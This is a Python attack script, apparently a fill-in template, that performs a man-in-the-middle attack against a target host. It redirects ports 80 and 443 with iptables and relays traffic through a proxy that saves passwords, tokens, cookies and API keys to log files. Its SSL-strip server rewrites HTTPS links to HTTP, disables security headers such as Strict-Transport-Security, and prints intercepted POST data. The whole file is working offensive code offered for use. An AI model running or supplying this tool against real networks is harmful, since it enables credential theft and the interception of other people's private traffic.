#!/usr/bin/env python3
"""
Man-in-the-Middle Attack
Target: {{ target_host }}
Type: {{ attack_type }}
"""

import socket
import ssl
import threading
import select
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess
import time

# Configuration
TARGET_HOST = "{{ target_host }}"
TARGET_PORT = {{ target_port | default(443) }}
LISTEN_PORT = {{ listen_port | default(8443) }}
ATTACK_TYPE = "{{ attack_type }}"  # ssl_strip, ssl_split, etc.

class MITMProxy:
    def __init__(self, listen_port, target_host, target_port):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.running = True

    def start(self):
        """Start the MITM proxy"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.listen_port))
        server_socket.listen(5)

        print(f"[*] MITM Proxy listening on port {self.listen_port}")
        print(f"[*] Forwarding to {self.target_host}:{self.target_port}")

        while self.running:
            try:
                client_socket, address = server_socket.accept()
                print(f"[+] Connection from {address}")

                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket,)
                )
                client_thread.start()

            except KeyboardInterrupt:
                self.running = False
                break

    def handle_client(self, client_socket):
        """Handle client connection"""
        try:
            # Connect to target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((self.target_host, self.target_port))

            # If HTTPS, wrap with SSL
            if self.target_port == 443:
                target_socket = ssl.wrap_socket(target_socket)

            # Start forwarding
            client_thread = threading.Thread(
                target=self.forward_data,
                args=(client_socket, target_socket, "client->target")
            )
            target_thread = threading.Thread(
                target=self.forward_data,
                args=(target_socket, client_socket, "target->client")
            )

            client_thread.start()
            target_thread.start()

            client_thread.join()
            target_thread.join()

        except Exception as e:
            print(f"[-] Error handling client: {e}")

        finally:
            client_socket.close()
            target_socket.close()

    def forward_data(self, source, destination, direction):
        """Forward data between sockets"""
        while self.running:
            try:
                ready, _, _ = select.select([source], [], [], 1.0)

                if ready:
                    data = source.recv(4096)
                    if not data:
                        break

                    # Log and modify data
                    self.log_data(data, direction)
                    modified_data = self.modify_data(data, direction)

                    destination.sendall(modified_data)

            except Exception as e:
                print(f"[-] Error forwarding data: {e}")
                break

    def log_data(self, data, direction):
        """Log intercepted data"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # Try to decode as text
            text_data = data.decode('utf-8', errors='ignore')

            # Log sensitive information
            if any(keyword in text_data.lower() for keyword in
                   ['password', 'token', 'authorization', 'cookie', 'api_key']):
                print(f"[!] {timestamp} - Sensitive data detected in {direction}")
                print(f"Data: {text_data[:200]}...")

                # Save to file
                with open(f"mitm_log_{timestamp.replace(' ', '_')}.txt", 'a') as f:
                    f.write(f"{direction}: {text_data}\n\n")

        except:
            # Binary data
            pass

    def modify_data(self, data, direction):
        """Modify data in transit"""
        if ATTACK_TYPE == "ssl_strip" and direction == "target->client":
            try:
                text_data = data.decode('utf-8', errors='ignore')

                # Replace HTTPS with HTTP
                modified = text_data.replace('https://', 'http://')

                # Remove security headers
                security_headers = [
                    'Strict-Transport-Security',
                    'Content-Security-Policy',
                    'X-Frame-Options'
                ]

                for header in security_headers:
                    modified = modified.replace(f'{header}:', f'X-{header}:')

                return modified.encode('utf-8')

            except:
                return data

        return data

class SSLStripServer(BaseHTTPRequestHandler):
    """SSL Strip server to downgrade HTTPS to HTTP"""

    def do_GET(self):
        """Handle GET requests"""
        # Forward request to target via HTTP
        target_url = f"http://{TARGET_HOST}{self.path}"

        # Log request
        print(f"[*] SSL Strip: {self.path}")

        # Forward request
        import requests
        response = requests.get(target_url, headers=dict(self.headers))

        # Send response
        self.send_response(response.status_code)
        for key, value in response.headers.items():
            if key.lower() not in ['content-encoding', 'transfer-encoding', 'content-length']:
                self.send_header(key, value)
        self.end_headers()

        # Modify content
        content = response.content.decode('utf-8', errors='ignore')
        content = content.replace('https://', 'http://')

        self.wfile.write(content.encode('utf-8'))

    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Log POST data
        print(f"[!] POST data: {post_data.decode('utf-8', errors='ignore')}")

        # Forward request
        target_url = f"http://{TARGET_HOST}{self.path}"

        import requests
        response = requests.post(target_url, data=post_data, headers=dict(self.headers))

        # Send response
        self.send_response(response.status_code)
        for key, value in response.headers.items():
            if key.lower() not in ['content-encoding', 'transfer-encoding', 'content-length']:
                self.send_header(key, value)
        self.end_headers()

        self.wfile.write(response.content)

def setup_iptables():
    """Setup iptables for traffic redirection"""
    print("[*] Setting up iptables rules...")

    commands = [
        f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {LISTEN_PORT}",
        f"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {LISTEN_PORT}",
        "echo 1 > /proc/sys/net/ipv4/ip_forward"
    ]

    for cmd in commands:
        subprocess.run(cmd, shell=True)

    print("[+] iptables rules configured")

def cleanup_iptables():
    """Clean up iptables rules"""
    print("[*] Cleaning up iptables rules...")

    commands = [
        "iptables -t nat -F",
        "echo 0 > /proc/sys/net/ipv4/ip_forward"
    ]

    for cmd in commands:
        subprocess.run(cmd, shell=True)

    print("[+] iptables rules cleaned")

def main():
    """Main function"""
    print("[*] Starting MITM Attack")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Attack Type: {ATTACK_TYPE}")

    try:
        # Setup iptables if needed
        if ATTACK_TYPE in ["ssl_strip", "ssl_split"]:
            setup_iptables()

        if ATTACK_TYPE == "ssl_strip":
            # Start SSL Strip server
            server = HTTPServer(('0.0.0.0', LISTEN_PORT), SSLStripServer)
            print(f"[*] SSL Strip server running on port {LISTEN_PORT}")
            server.serve_forever()
        else:
            # Start MITM proxy
            proxy = MITMProxy(LISTEN_PORT, TARGET_HOST, TARGET_PORT)
            proxy.start()

    except KeyboardInterrupt:
        print("\n[*] Stopping MITM attack...")

    finally:
        if ATTACK_TYPE in ["ssl_strip", "ssl_split"]:
            cleanup_iptables()

if __name__ == "__main__":
    main()